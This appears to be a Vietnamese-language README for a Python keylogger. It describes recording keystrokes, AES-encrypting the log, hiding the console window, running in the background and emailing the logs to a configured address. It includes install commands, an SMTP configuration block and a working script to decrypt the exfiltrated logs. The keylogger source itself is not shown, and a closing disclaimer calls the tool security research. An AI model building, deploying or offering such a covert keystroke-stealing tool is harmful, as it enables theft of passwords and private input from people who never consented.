# Keylogger với Mã hóa AES và Gửi Email

## Giới thiệu

Đây là một keylogger được viết bằng Python, có khả năng ghi lại các phím bấm trên bàn phím, mã hóa dữ liệu bằng AES và gửi log qua email. Chương trình có các tính năng chính như:
- Ghi lại các phím bấm và lưu vào tệp log.
- Mã hóa log bằng AES để bảo vệ dữ liệu.
- Tự động gửi log đến email được cấu hình.
- Giới hạn tài nguyên sử dụng để giảm thiểu ảnh hưởng đến hiệu suất hệ thống.

## Yêu cầu hệ thống

- Python 3.6 trở lên
- Hệ điều hành: Windows hoặc Linux
- Các thư viện Python:
  - `pynput`
  - `pycryptodome`
  - `psutil`
  - `smtplib`

## Cài đặt

1. Cài đặt Python (nếu chưa có):
   - Windows: [Tải Python tại đây](https://www.python.org/downloads/)
   - Linux: Cài đặt qua terminal:
     ```bash
     sudo apt update && sudo apt install python3 python3-pip -y
     ```

2. Cài đặt các thư viện cần thiết:
   ```bash
   pip install pynput pycryptodome psutil
   ```

## Cấu hình

Mở tệp mã nguồn và cập nhật thông tin email:
```python
EMAIL_ADDRESS = "your_email@mail.com"
EMAIL_PASSWORD = "your_password"
TO_EMAIL = "receiver@mail.com"
SMTP_SERVER = "your_smtp_server"
SMTP_PORT = 2525
SECRET_KEY = b'16byteslongkey!!'  # Chỉ được dùng 16, 24 hoặc 32 byte
```

## Cách chạy chương trình

Chạy script bằng lệnh:
```bash
python keylogger.py
```
Sau khi chạy, chương trình sẽ ẩn cửa sổ console (trên Windows) và chạy nền để ghi lại các phím bấm.

## Giải mã log

Khi nhận được email chứa log đã mã hóa, bạn có thể giải mã bằng đoạn mã sau:
```python
import base64
from Crypto.Cipher import AES

SECRET_KEY = b'16byteslongkey!!'  # Phải trùng với khóa trong mã nguồn

def decrypt_log(encrypted_data):
    decoded_data = base64.b64decode(encrypted_data)
    nonce = decoded_data[:16]
    ciphertext = decoded_data[16:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce=nonce)
    decrypted_data = cipher.decrypt(ciphertext)
    return decrypted_data.decode()

# Thay thế bằng log đã mã hóa từ email
encrypted_log = "dsfasdasdfasdfdHctGeZBvjJBOIepKxgybte5eZfZDpuXN7Zg4/MkAcrmrjGKCtDNTswONDa6f6S3f5ndSPSlAkC7aRavoig=="
print(decrypt_log(encrypted_log))
```

## Lưu ý bảo mật

- **Không sử dụng phần mềm này cho mục đích trái phép**. Đây là công cụ nghiên cứu bảo mật và phải tuân thủ pháp luật.
- **Không chia sẻ khóa mã hóa và thông tin email công khai**.
- **Chạy thử nghiệm trên môi trường cá nhân hoặc được ủy quyền**.

## Giấy phép

Phần mềm này chỉ dành cho mục đích học tập và nghiên cứu bảo mật. Người sử dụng chịu trách nhiệm về mọi hành vi vi phạm pháp luật.

